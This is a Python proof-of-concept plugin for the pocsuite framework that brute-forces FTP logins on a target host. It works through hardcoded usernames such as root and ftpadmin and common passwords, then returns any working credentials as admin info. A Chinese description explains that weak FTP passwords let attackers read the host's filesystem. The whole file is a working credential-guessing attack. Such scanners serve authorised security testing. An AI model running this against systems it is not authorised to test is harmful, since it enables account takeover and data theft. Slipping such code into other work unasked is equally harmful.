#!/usr/bin/python
# -*- coding: utf-8 -*-
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
import socket
from ftplib import FTP

class ftp(object):
    def __init__(self,target,port):
        self.target=target
        self.port=int(port)
        self.uservales=[]
        self.passwordvales=[]
    def check_port(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            port = sock.connect_ex((self.target,self.port))
            if port == 0:
                sock.close
                return True
            else:
                sock.close
                return False

        except socket.gaierror:
            print('Name or service not known')
            self.run()
    def brute_force_list(self):
        try:
            users = ["root", "ftp1", "ftp", "ftpadmin", "ftpusr"]
            passwords = ["root", "123456", "cisco123", "admin", "Admin", "Admin123", "toor", "system", "system123",
                             "System", "System123", "Admin123!@#", "root123!@#"]
            for user in users:
                user = user.strip()
                for password in passwords:
                    password = password.strip()
                    self.ftpbruter(user, password)
                    if self.uservales:
                        break
        except KeyboardInterrupt:
            return False
    def ftpbruter(self, username, password):
        try:
            ftp = FTP(self.target)
            ftp.login(username, password)
            ftp.quit()
            self.uservales.append(username)
            self.passwordvales.append(password)
        except KeyboardInterrupt:
            pass
        except:
            pass

    def run(self):
        try:
            if self.check_port() == True:
                self.brute_force_list()
                return (self.uservales,self.passwordvales)
            else:
                print('The port 21 is not open! Are you sure that is the FTP server?')
                return False
        except KeyboardInterrupt:
            return False

def poc(url):
    if url.startswith("http://"):
        url = url.strip("http://")
    if url.endswith("/"):
        url = url.strip("/")
    if ":" in url:
        url = url.split(":")
        ip = url[0]
        port = url[1]
        response = ftp(ip, port).run()
        return response
    else:
        ip=url
        response = ftp(ip, "21").run()
        return response

class TestPOC(POCBase):
    name = 'ftp_weak_pass'
    vulID = '无'
    author = ['sxd']
    vulType = 'weak-pass'
    version = '1.0'  # default version: 1.0
    references = ['https://www.seebug.org/vuldb/ssvid-62522']
    desc = '''
		   当网络上的主机提供匿名FTP服务时，用户则可以通过anonymous/空、FTP/FTP、USER/pass等匿名账号登陆到这些FTP服务器。

如果 FTP 服务使用了弱密码，攻击者可以加载字典文件猜解密码。

攻击者可以通过该漏洞获取主机文件系统信息。
		   '''
    vulDate = '2020-03-09'
    createDate = '2020-03-09'
    updateDate = '2020-03-09'
    appName = 'ftp'
    appVersion = 'ftp all'
    appPowerLink = ''
    samples = ['FTP','socket']

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        response = poc(self.url)
        if response[0]:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url + ' ftp_weak_paass' + ' is exist!'
            result['AdminInfo'] = {}
            result['AdminInfo']['Username'] = response[0]
            result['AdminInfo']['Password'] = response[1]
        return self.parse_output(result)
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
